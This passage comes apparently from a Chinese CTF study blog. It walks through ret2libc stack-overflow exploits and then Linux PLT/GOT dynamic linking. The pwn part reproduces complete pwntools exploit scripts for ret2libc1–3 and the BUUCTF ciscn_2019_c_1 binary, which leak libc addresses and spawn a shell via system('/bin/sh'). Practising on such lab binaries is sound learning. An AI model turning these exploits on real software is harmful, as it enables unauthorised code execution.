alt="image-20220420160233130"></p><p>上图中的esp指在0xff8b67b4栈地址处，而我的理想是它指在下图中的0xff8b6b20栈地址处，明显0xff8b67b4&lt;0xff8b6b20，所以说上图中的esp在下图中esp的下方，又因为我们整个过程只由我们主观调用了system函数，所以我们还在system函数中进程就结束了，而结束的原因就是我们已经拿到系统的shell了</p><p><img src="image-20220420160307311.png" alt="image-20220420160307311"></p><p>4、以上说明了我们获得shell的地方是在执行system函数的过程中，所以在以上的探索中我们只看到了system函数的函数头部分而一直没找到system的函数尾部分</p><p><img src="image-20220420160744322.png" alt="image-20220420160744322"></p><p>5、综上，对于这句 payload = flat([‘a’ * 112, system_plt, ‘b’ * 4, binsh_addr]) ，我有了我的一个暂时说得通的理解（应该是错的，但能勉强说通），通过栈溢出，我们可以令程序跳转至system函数，然后在执行system函数头后，会将esp往上四个栈地址（包括esp指向的栈地址）上的数据传入system函数，如下，然后system会调用arg[1]存储的数据进行相应的操作，所以在覆盖时我们需要隔4个字符存储/bin/sh的地址，然而为什么要用arg[1]而不用arg[0]，我暂时还没想好是什么原因，（再提一嘴，arg[0]是执行到这条汇编时的esp指向的栈地址上存储的数据）</p><p><img src="image-20220420161426628.png" alt="image-20220420161426628"></p><br/><p><strong>小结：</strong></p><p>&nbsp;&nbsp;&nbsp;&nbsp;之前我从未想到过系统的shell是在执行system函数时拿到的，所以很多地方都想不通，现在也算是想通一部分了吧，ok，ret2libc1的exp探索结束了，之后还有ret2libc2和ret2libc3的，其实我感觉最难搞懂的点也就这里的 payload = flat([‘a’ * 112, system_plt, ‘b’ * 4, binsh_addr]) 中为什么间隔的那四个无用字符。</p><br/><br/><h2 id="一些小细节-不明白的地方"><a href="#一些小细节-不明白的地方" class="headerlink" title="一些小细节(不明白的地方)"></a>一些小细节(不明白的地方)</h2><p>细节1：</p><p><img src="image-20220420112332154.png" alt="image-20220420112332154"></p><p><img src="image-20220420112521081.png" alt="image-20220420112521081"></p><p>do为循环标志</p><br/><br/><h1 id="exp中payload分析2"><a href="#exp中payload分析2" class="headerlink" title="exp中payload分析2"></a>exp中payload分析2</h1><p>源自： <a href="https://blog.csdn.net/qq_40827990/article/details/86662079?ops_request_misc=%7B%22request_id%22:%22164828478816780271961568%22,%22scm%22:%2220140713.130102334.pc_all.%22%7D&request_id=164828478816780271961568&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-1-86662079.142%5Ev5%5Epc_search_result_cache,143%5Ev6%5Eregister&utm_term=ret2libc2&spm=1018.2226.3001.4187">Ret2libc_钞sir的博客-CSDN博客_ret2libc </a> </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">#ret2libc1</span><br><span class="line">from pwn import *</span><br><span class="line">p = process(&#x27;./ret2libc1&#x27;)</span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line">system_addr = 0x08048460</span><br><span class="line">binsh_addr = 0x8049720</span><br><span class="line">p.recvuntil(&#x27;RET2LIBC &gt;_&lt;\n&#x27;)</span><br><span class="line">p.sendline(&#x27;a&#x27;*112 + p32(system_addr) + &#x27;aaaa&#x27; + p32(binsh_addr))</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#ret2libc2</span><br><span class="line">from pwn import *</span><br><span class="line">p = process(&#x27;./ret2libc2&#x27;)</span><br><span class="line">buf2_addr = 0x804a080</span><br><span class="line">gets_addr = 0x8048460</span><br><span class="line">system_addr = 0x8048490</span><br><span class="line">pop_ebx_addr = 0x0804843d</span><br><span class="line">p.recvuntil(&#x27;What do you think ?&#x27;)</span><br><span class="line">p.sendline(&#x27;a&#x27;*112 + p32(gets_addr) + p32(pop_ebx_addr) + p32(buf2_addr) + p32(system_addr) + &#x27;aaaa&#x27; + p32(buf2_addr))</span><br><span class="line">p.sendline(&#x27;/bin/sh\x00&#x27;)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#ret2libc3</span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import LibcSearcher</span><br><span class="line">p = process(&#x27;./ret2libc3&#x27;)</span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line">start_addr = 0x80484d0</span><br><span class="line">puts_plt_addr = 0x8048460</span><br><span class="line">libc_start_main_got_addr = 0x804a024</span><br><span class="line">p.recvuntil(&#x27;Can you find it !?&#x27;)</span><br><span class="line">p.sendline(&#x27;q&#x27;*112 + p32(puts_plt_addr) + p32(start_addr) + p32(libc_start_main_got_addr))</span><br><span class="line">libc_start_main_addr = u32(p.recv(4))</span><br><span class="line">print &quot;__libc_start_main_addr: &quot; + hex(libc_start_main_addr)</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(&#x27;__libc_start_main&#x27;, libc_start_main_addr)</span><br><span class="line">libcbase = libc_start_main_addr - libc.dump(&#x27;__libc_start_main&#x27;)</span><br><span class="line">system_addr = libcbase + libc.dump(&#x27;system&#x27;)</span><br><span class="line">binsh_addr = libcbase + libc.dump(&#x27;str_bin_sh&#x27;) + 0xb9</span><br><span class="line">print &quot;system_addr: &quot; + hex(system_addr)</span><br><span class="line">print &quot;binsh_addr: &quot; + hex(binsh_addr)</span><br><span class="line">p.recvuntil(&#x27;Can you find it !?&#x27;)</span><br><span class="line">p.sendline(&#x27;s&#x27;*112 + p32(system_addr) + &#x27;aaaa&#x27; + p32(binsh_addr))</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">1：&#x27;a&#x27;*112 + p32(system_addr) + &#x27;aaaa&#x27; + p32(binsh_addr)</span><br><span class="line"></span><br><span class="line">2：&#x27;a&#x27;*112 + p32(gets_addr) + p32(pop_ebx_addr) + p32(buf2_addr) + p32(system_addr) + &#x27;aaaa&#x27; + p32(buf2_addr)</span><br><span class="line"></span><br><span class="line">3：&#x27;q&#x27;*112 + p32(puts_plt_addr) + p32(start_addr) + p32(libc_start_main_got_addr)</span><br><span class="line">   &#x27;s&#x27;*112 + p32(system_addr) + &#x27;aaaa&#x27; + p32(binsh_addr)</span><br></pre></td></tr></table></figure><p>现在我们来看看ret2libc2中的payload：’a’*112 + p32(gets_addr) + p32(pop_ebx_addr) + p32(buf2_addr) + p32(system_addr) + ‘aaaa’ + p32(buf2_addr)</p><br/><p>首先，gets_addr代表gets函数的plt表地址，pop_ebx_addr代表pop eip 、retn这两条指令的地址，buf2_addr代表bss段上的buf2数组的初始地址，system_addr代表system函数的plt表地址，buf2_addr，依照我们的exp执行，此时的buf2上已经存储好了/bin/sh字段，system函数调用后就直接拿到shell。</p><p><img src="image-20220420235733396.png" alt="image-20220420235733396"></p><p><img src="image-20220421000324213.png" alt="image-20220421000324213"></p><p>接下来看过程：</p><p>1、此时栈上的数据排布已被payload覆盖成下图的模样</p><p><img src="image-20220420235632600.png" alt="image-20220420235632600"></p><p>2、</p><p><img src="image-20220420235915866.png" alt="image-20220420235915866"></p><p>3、pop  ebp，ebp指向不存在的栈地址0x61616161</p><p><img src="image-20220421000252529.png" alt="image-20220421000252529"></p><p>4、pop先取数据再增esp，下一条是jmp  eip，不列了，没意义</p><p><img src="image-20220421000643586.png" alt="image-20220421000643586"></p><p>5、此时我们进入先gets函数的plt，在之前的实操环节中，有一个结论：调用plt、got表前后，esp、ebp值不变，所以我们就当没有查plt、got表这一步，直接进入gets函数中执行，因为gets函数它也是函数，进入后第一件事那肯定是执行函数头嘛，所以有了下图</p><p><img src="image-20220421001119679.png" alt="image-20220421001119679"></p><p>6、</p><p><img src="image-20220421001228059.png" alt="image-20220421001228059"></p><p>7、and  esp，0FFFFFFF0h，这步对齐操作直接略过吧，对结果毫无影响</p><p>8、接下来执行gets函数的函数中间部分，这里面会有三步关键操作：</p><p>&nbsp;&nbsp;&nbsp;&nbsp;1）：esp及esp往上的栈上数据作为参数传递给gets函数（注：经过之前的调试，得知这一步是在执行函数头前执行的，也就是第5步之前，所以gets函数中间部分理应只有以下两个操作）</p><p>&nbsp;&nbsp;&nbsp;&nbsp;2）：从外界读入一串字符（外界可以理解为缓冲区吧）</p><p>&nbsp;&nbsp;&nbsp;&nbsp;3）：以buf2_addr这一地址参数作为gets函数的字符容器，也就是把gets到的字符串存入bss段上的buf2（为什么选择buf2_addr这一参数？我又不是开发汇编的，我哪知道，这里就举个例子吧，就像上一个payload分析中system函数与/bin/sh要相隔一个”bbbb”一样，这里的gets函数和buf2_addr也相隔了一个单位的栈空间，暂时就这样理解吧，做pwn题知道这些就够了）</p><p>注：对于2）和3）先后执行哪个我现在还不清楚</p><p>下图中可以看到我们还给程序发送了一串字符，这串字符就是被上述gets读进buf2中的字符，/bin/sh与一个结尾标志符</p><p><img src="image-20220421001658830.png" alt="image-20220421001658830"></p><p>9、</p><p><img src="image-20220421003330425.png" alt="image-20220421003330425"></p><p>10、下一条是jmp  eip，不列了，没意义</p><p><img src="image-20220421003434374.png" alt="image-20220421003434374"></p><p>11、pop_ebx_addr的地址是0x0804843d，可以看到当PC指针跳转至这里开始执行时，会执行一个pop  ebx和一个retn，接下来跟着执行就行</p><p><img src="image-20220421003627350.png" alt="image-20220421003627350"></p><p>12、pop  ebx</p><p><img src="image-20220421003922794.png" alt="image-20220421003922794"></p><p>13、retn拆成pop  eip与jmp  eip，jmp  eip意义不大，不列出</p><p><img src="image-20220421004039324.png" alt="image-20220421004039324"></p><p>14、接下来调用system函数，并且以地址buf2_addr处的数据，即buf2上的/bin/sh作为参数进行相应操作，即get shell（获取最高权限）</p><p>15、分析完毕。</p><br/><br/><h1 id="exp中payload分析3"><a href="#exp中payload分析3" class="headerlink" title="exp中payload分析3"></a>exp中payload分析3</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">#ret2libc3</span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import LibcSearcher</span><br><span class="line">p = process(&#x27;./ret2libc3&#x27;)</span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line">start_addr = 0x80484d0</span><br><span class="line">puts_plt_addr = 0x8048460</span><br><span class="line">libc_start_main_got_addr = 0x804a024</span><br><span class="line">p.recvuntil(&#x27;Can you find it !?&#x27;)</span><br><span class="line">p.sendline(&#x27;q&#x27;*112 + p32(puts_plt_addr) + p32(start_addr) + p32(libc_start_main_got_addr))</span><br><span class="line">libc_start_main_addr = u32(p.recv(4))</span><br><span class="line">print &quot;__libc_start_main_addr: &quot; + hex(libc_start_main_addr)</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(&#x27;__libc_start_main&#x27;, libc_start_main_addr)</span><br><span class="line">libcbase = libc_start_main_addr - libc.dump(&#x27;__libc_start_main&#x27;)</span><br><span class="line">system_addr = libcbase + libc.dump(&#x27;system&#x27;)</span><br><span class="line">binsh_addr = libcbase + libc.dump(&#x27;str_bin_sh&#x27;) + 0xb9</span><br><span class="line">print &quot;system_addr: &quot; + hex(system_addr)</span><br><span class="line">print &quot;binsh_addr: &quot; + hex(binsh_addr)</span><br><span class="line">p.recvuntil(&#x27;Can you find it !?&#x27;)</span><br><span class="line">p.sendline(&#x27;s&#x27;*112 + p32(system_addr) + &#x27;aaaa&#x27; + p32(binsh_addr))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>对于payload = ‘q’*112 + p32(puts_plt_addr) + p32(start_addr) + p32(libc_start_main_got_addr)<br>   与 payload = ‘s’*112 + p32(system_addr) + ‘aaaa’ + p32(binsh_addr)</p><br/><p>自行动手做做分析吧，昂 ^_^</p><br/><br/><h1 id="exp中payload分析4-64位"><a href="#exp中payload分析4-64位" class="headerlink" title="exp中payload分析4(64位)"></a>exp中payload分析4(64位)</h1><p>之前分析的都是32位的，这里简单分析一个64位的exp</p><p>exp来源：<a href="https://blog.csdn.net/weixin_43833642/article/details/106477678?ops_request_misc=&request_id=&biz_id=102&utm_term=ciscn_2019_c_1&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-4-106477678.nonecase&spm=1018.2226.3001.4187">BUUCTF ciscn_2019_c_1_、moddemod的博客-CSDN博客</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line"></span><br><span class="line">def encrypt(text:list):</span><br><span class="line">    new_list = []</span><br><span class="line">    for i in text:</span><br><span class="line">        if i &lt;= 96 or i &gt; 122:</span><br><span class="line">            if i &lt;= 64 or i &gt; 90:</span><br><span class="line">                if i &gt; 47 and i &lt;= 57:</span><br><span class="line">                    i ^= 0xF</span><br><span class="line">            else:</span><br><span class="line">                i ^= 0xE</span><br><span class="line">        else:</span><br><span class="line">            i ^= 0xD</span><br><span class="line">        new_list.append(chr(i))</span><br><span class="line">    return &#x27;&#x27;.join(new_list)</span><br><span class="line"></span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line">proc_name = [&#x27;/home/moddemod/binary/ciscn_2019_c_1&#x27;]</span><br><span class="line">elf = ELF(proc_name[0])</span><br><span class="line">p = process(proc_name)</span><br><span class="line"># p = remote(&#x27;node3.buuoj.cn&#x27;, 26038)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(&#x27;1&#x27;)</span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = 0x400c83</span><br><span class="line">got_puts = elf.got[&#x27;puts&#x27;]</span><br><span class="line">plt_puts = elf.plt[&#x27;puts&#x27;]</span><br><span class="line">main_addr = elf.symbols[&#x27;main&#x27;]</span><br><span class="line">payload = 0x58 * b&#x27;a&#x27; + p64(pop_rdi_ret) + p64(got_puts) + p64(plt_puts) + p64(main_addr)</span><br><span class="line">p.sendline(encrypt(list(payload)))</span><br><span class="line"># p.recv()</span><br><span class="line">print(p.recvuntil(&#x27;\n&#x27;))</span><br><span class="line">print(p.recvuntil(&#x27;\n&#x27;))</span><br><span class="line">puts_real_addr = u64(p.recvuntil(&#x27;\n&#x27;, drop=True).ljust(8, b&#x27;\x00&#x27;))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(&#x27;puts&#x27;, puts_real_addr)</span><br><span class="line">libc_base = puts_real_addr - libc.dump(&#x27;puts&#x27;)</span><br><span class="line">p.sendline(&#x27;1&#x27;)</span><br><span class="line">p.recvuntil(&#x27;encrypted\n&#x27;)</span><br><span class="line">system_addr = libc_base + libc.dump(&#x27;system&#x27;)</span><br><span class="line">bin_sh_addr = libc_base + libc.dump(&#x27;str_bin_sh&#x27;)</span><br><span class="line"></span><br><span class="line">ret = 0x4006b9</span><br><span class="line">payload = b&#x27;9&#x27; * 0x58 + p64(ret) + p64(pop_rdi_ret) + p64(bin_sh_addr) + p64(system_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>可以看到我们构造了两句payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="number">0x58</span> * <span class="string">b&#x27;a&#x27;</span> + p64(pop_rdi_ret) + p64(got_puts) + p64(plt_puts) + p64(main_addr)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;9&#x27;</span> * <span class="number">0x58</span> + p64(ret) + p64(pop_rdi_ret) + p64(bin_sh_addr) + p64(system_addr)</span><br></pre></td></tr></table></figure><p>这里再把32位的列举出来做对比</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#</span></span><br><span class="line">payload = <span class="string">&#x27;q&#x27;</span>*<span class="number">112</span> + p32(puts_plt_addr) + p32(start_addr) + p32(libc_start_main_got_addr)</span><br><span class="line">payload = <span class="string">&#x27;s&#x27;</span>*<span class="number">112</span> + p32(system_addr) + <span class="string">&#x27;aaaa&#x27;</span> + p32(binsh_addr)</span><br></pre></td></tr></table></figure><p>可见，仅是多出了一步与rdi相关的操作（因为64位程序将前6个参数分别存至RDI, RSI, RDX, RCX, R8 和 R9这六个寄存器，只有参数超过6个的情况才会将多余的参数入栈）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#p64(pop_rdi_ret) + p64(got_puts) + p64(plt_puts) + p64(main_addr)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#所以这里的先执行了一个pop rdi的gadget</span></span><br><span class="line"><span class="comment">#也就是把puts的got地址放到了rdi里</span></span><br><span class="line"><span class="comment">#下一条是putsplt</span></span><br><span class="line"><span class="comment">#就puts(puts_got)</span></span><br><span class="line"><span class="comment">#这样就把got表里存放的puts地址给泄露出来啦</span></span><br><span class="line"><span class="comment">#紧接着返回main函数</span></span><br><span class="line"><span class="comment">#又可以重新打一遍</span></span><br></pre></td></tr></table></figure><br/><br/><h1 id="栈对齐"><a href="#栈对齐" class="headerlink" title="栈对齐"></a>栈对齐</h1><p>暂无</p>]]></content>
    
    
    <summary type="html">Pwn-基础</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>博文收藏</title>
    <link href="http://xiaoxiaoxy1.github.io/2022/04/16/%E5%8D%9A%E6%96%87%E6%94%B6%E8%97%8F/"/>
    <id>http://xiaoxiaoxy1.github.io/2022/04/16/%E5%8D%9A%E6%96%87%E6%94%B6%E8%97%8F/</id>
    <published>2022-04-16T14:30:41.000Z</published>
    <updated>2022-05-19T16:29:07.143Z</updated>
    
    <content type="html"><![CDATA[<p>因为担心有些博文会被博主删除，在这里提前copy一份</p><p>文章转自：<a href="https://www.yuque.com/hxfqg9/bin/ug9gx5#5dvaL">Basic-ROP · 语雀 (yuque.com)</a></p><br/><h2 id="Linux动态链接"><a href="#Linux动态链接" class="headerlink" title="* Linux动态链接"></a>* Linux动态链接</h2><p><a href="https://blog.csdn.net/linyt/article/details/51635768">参考博文</a></p><p>关于动态链接与静态链接，可以打个比方就是：如果我的文章引用了别人的一部分文字，在我发布文章的时候把别人的段落复制到我的文章里面就属于静态连接，而做一个超链接让你们自己去看就属于动态链接了</p><h3 id="PLT-amp-GOT"><a href="#PLT-amp-GOT" class="headerlink" title="PLT&amp;GOT"></a>PLT&amp;GOT</h3><p>linux下的动态链接是通过PLT&amp;GOT来实现的，这里做一个实验，通过这个实验来理解</p><p>使用如下源代码 test.c：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_banner</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Welcome to World of PLT and GOT\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    print_banner();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>依次使用下列命令进行编译：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -Wall -g -o test.o -c test.c -m32</span><br><span class="line">gcc -o test test.o -m32</span><br></pre></td></tr></table></figure><p>这样除了原有的 test.c 还有个 test.o 以及可执行文件 test</p><p>通过 <code>objdump -d test.o</code> 可以查看反汇编</p><p><img src="1574510177475-db49a7d5-6909-421e-a868-6829c9a7b4a4.png" alt="img"></p><p>printf() 和函数是在 glibc 动态库里面的，只有当程序运行起来的时候才能确定地址，所以此时的 printf() 函数先用 fc ff ff ff 也就是有符号数的 -4 代替</p><p>运行时进行重定位是无法修改代码段的，只能将 printf 重定位到数据段，但是已经编译好的程序，调用 printf 的时候怎么才能找到这个地址呐？</p><p>链接器会额外生成一小段代码，通过这段代码来获取 printf() 的地址，像下面这样，进行链接的时候只需要对printf_stub() 进行重定位操作就可以</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">.text</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">// 调用printf的call指令</span><br><span class="line">call printf_stub</span><br><span class="line">...</span><br><span class="line">printf_stub:</span><br><span class="line">    mov rax, [printf函数的储存地址] // 获取printf重定位之后的地址</span><br><span class="line">    jmp rax // 跳过去执行printf函数</span><br><span class="line"></span><br><span class="line">.data</span><br><span class="line">...</span><br><span class="line">printf函数的储存地址,这里储存printf函数重定位后的地址</span><br></pre></td></tr></table></figure><p>总体来说，动态链接每个函数需要两个东西：</p><p>1、用来存放外部函数地址的数据段</p><p>2、用来获取数据段记录的外部函数地址的代码</p><p>对应有两个表，一个用来存放外部的函数地址的数据表称为<strong>全局偏移表</strong>（<strong>GOT</strong>, Global Offset Table），那个存放额外代码的表称为<strong>程序链接表</strong>（<strong>PLT</strong>，Procedure Link Table）</p><p><img src="1574513788142-e66171f3-6300-4e14-ab57-cc301c936829.jpeg" alt="img"></p><p>可执行文件里面保存的是 PLT 表的地址，对应 PLT 地址指向的是 GOT 的地址，GOT 表指向的就是 glibc 中的地址</p><p>那我们可以发现，在这里面想要通过 plt 表获取函数的地址，首先要保证 got 表已经获取了正确的地址，但是在一开始就进行所有函数的重定位是比较麻烦的，为此，linux 引入了延迟绑定机制</p><h3 id="延迟绑定"><a href="#延迟绑定" class="headerlink" title="延迟绑定"></a>延迟绑定</h3><p>只有动态库函数在被调用时，才会地址解析和重定位工作，为此可以使用类似这样的代码来实现：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//一开始没有重定位的时候将 printf@got 填成 lookup_printf 的地址</span></span><br><span class="line"><span class="keyword">void</span> <span class="built_in">printf</span>@plt()</span><br><span class="line">&#123;</span><br><span class="line">address_good:</span><br><span class="line">    jmp *<span class="built_in">printf</span>@got   </span><br><span class="line">lookup_printf:</span><br><span class="line">    调用重定位函数查找 <span class="built_in">printf</span> 地址，并写到 <span class="built_in">printf</span>@got</span><br><span class="line"><span class="keyword">goto</span> address_good;<span class="comment">//再返回去执行address_good</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>说明一下这段代码工作流程，一开始，printf@got 是 lookup_printf 函数的地址，这个函数用来寻找 printf() 的地址，然后写入 printf@got，lookup_printf 执行完成后会返回到 address_good，这样再 jmp 的话就可以直接跳到printf 来执行了</p><p>也就是说这样的机制的话如果不知道 printf 的地址，就去找一下，知道的话就直接去 jmp 执行 printf 了</p><p>接下来，我们就来看一下这个“找”的工作是怎么实现的：</p><p>通过 <code>objdump -d test &gt; test.asm</code> 可以看到其中 plt 表项有三条指令</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Disassembly of section .plt:</span><br><span class="line"></span><br><span class="line"><span class="number">080482</span>d0 &lt;common@plt&gt;:</span><br><span class="line"> <span class="number">80482</span>d0:ff <span class="number">35</span> <span class="number">04</span> a0 <span class="number">04</span> <span class="number">08</span>    pushl  <span class="number">0x804a004</span></span><br><span class="line"> <span class="number">80482</span>d6:ff <span class="number">25</span> <span class="number">08</span> a0 <span class="number">04</span> <span class="number">08</span>    jmp    *<span class="number">0x804a008</span></span><br><span class="line"> <span class="number">80482</span>dc:<span class="number">00</span> <span class="number">00</span>                add    %al,(%eax)</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="number">080482e0</span> &lt;<span class="built_in">puts</span>@plt&gt;:</span><br><span class="line"> <span class="number">80482e0</span>:ff <span class="number">25</span> <span class="number">0</span>c a0 <span class="number">04</span> <span class="number">08</span>    jmp    *<span class="number">0x804a00c</span></span><br><span class="line"> <span class="number">80482e6</span>:<span class="number">68</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       push   $<span class="number">0x0</span></span><br><span class="line"> <span class="number">80482</span>eb:e9 e0 ff ff ff       jmp    <span class="number">80482</span>d0 &lt;_init+<span class="number">0x28</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="number">080482f</span>0 &lt;__libc_start_main@plt&gt;:</span><br><span class="line"> <span class="number">80482f</span>0:ff <span class="number">25</span> <span class="number">10</span> a0 <span class="number">04</span> <span class="number">08</span>    jmp    *<span class="number">0x804a010</span></span><br><span class="line"> <span class="number">80482f</span>6:<span class="number">68</span> <span class="number">08</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       push   $<span class="number">0x8</span></span><br><span class="line"> <span class="number">80482f</span>b:e9 d0 ff ff ff       jmp    <span class="number">80482</span>d0 &lt;_init+<span class="number">0x28</span>&gt;</span><br></pre></td></tr></table></figure><p>ps.这里 plt 表的第一项使用 objdump 的时候给没有符号名的一项自动改成了离他最近的一项，为了避免引起误会，改成了 common，而且随着不断深入，会发现，确实可以叫 common</p><p>其中除第一个表项以外，plt 表的第一条都是跳转到对应的 got 表项，而 got 表项的内容我们可以通过 gdb 来看一下，如果函数还没有执行的时候，这里的地址是对应 plt 表项的下一条命令，即 push 0x0</p><p>（说一下怎么查看，先 <code>gdb test</code> 然后 <code>b main</code>，再 <code>run</code>， 再 <code>x/x jmp的那个地址</code> 就可以）</p><p><img src="1580779496150-487cd998-b4af-4bb0-ad41-9ab376a7f8ff.png" alt="img"></p><p>还记得之前我们说的，在还没有执行过函数之前 printf@got 的内容是 lookup_printf 函数的地址吗，这就是要去找 printf 